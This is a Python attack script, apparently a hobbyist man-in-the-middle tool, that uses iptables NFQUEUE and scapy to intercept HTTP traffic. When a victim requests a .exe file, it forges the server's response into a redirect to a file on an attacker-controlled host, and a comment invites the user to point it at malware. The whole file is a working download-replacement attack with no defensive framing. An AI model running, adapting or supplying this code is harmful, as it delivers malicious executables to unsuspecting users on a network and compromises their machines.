#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy
import sys, os, subprocess
import time


def root_check():
    if os.geteuid() != 0:
        sys.exit("[!] This script must run as root")
    else:
        print("[*] Welcome to the DNS Spoofer.")


def iptable_insert():
    try:
        subprocess.run(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
        '''
        or
        subprocess.run(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
        subprocess.run(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
        '''
        print("[*] Iptables intercepting rule inserted")
    except Exception as e:
        print(f"[!] Error inserting iptables rule: {e}")

def iptable_flush():
    try:
        subprocess.run(['iptables', '--flush'], check=True)
        print("[*] Iptables rules flushed")
    except Exception as e:
        print(f"[!] Error flushing iptables: {e}")


def process_packet(packet):
    global packet_count
    packet_count += 1
    TTL = 10

    scapy_packet = scapy.IP(packet.get_payload())
    
    if scapy_packet.haslayer(scapy.Raw):
        # Check for HTTP Request
        if scapy_packet[scapy.TCP].dport == 80:
            if b".exe" in scapy_packet[scapy.Raw].load:
                print("[+] .exe file download detected")

                # Store the expected ACK with the current timestamp
                ack_dict[scapy_packet[scapy.TCP].ack] = time.time()

        # Check for HTTP Response
        elif scapy_packet[scapy.TCP].sport == 80:
            current_seq = scapy_packet[scapy.TCP].seq

            if current_seq in ack_dict:
                del ack_dict[current_seq]
                print("[+] Replacing file")

                #Forge the Response
                #Change this location to malware. I mean your selected file..
                modified_load = b"HTTP/1.1 301 Moved Permanently\nLocation: https://192.168.1.50/Path/to/file.exe\r\n\r\n"
                scapy_packet[scapy.Raw].load = modified_load
                # Remove checksums so Scapy recalculates them
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].len
                del scapy_packet[scapy.TCP].chksum
                # Set the modified payload back to the netfilter packet
                packet.set_payload(bytes(scapy_packet))

    #Memory cleanup after every 500 packet
    if packet_count % 500 == 0:
        current_time = time.time()
        #Awsome list comprehension
        expired_keys = [k for k, v in ack_dict.items() if current_time - v > 10]
        for k in expired_keys:
            del ack_dict[k] 

    packet.accept()


if __name__ == "__main__":
    root_check()
    iptable_insert()

    # create the object, bind to the iptables command and run
    queue = netfilterqueue.NetfilterQueue()
    
    ack_dict = {}
    packet_count = 0

    try:
        queue.bind(1337, process_packet)
        try:
            print("[*] Starting packet interception. Press Ctrl+C to stop.")
            queue.run()
        except KeyboardInterrupt:
            print("\n[!] User Interruption detected. Exiting gracefully.")
        except Exception as e:
            print(f"[!] An error has occurred running NSQUEU: {e}")
    except Exception as e:
        print(f"[!] An error has occurred binding NSQUEU: {e}")
    finally:
        iptable_flush()
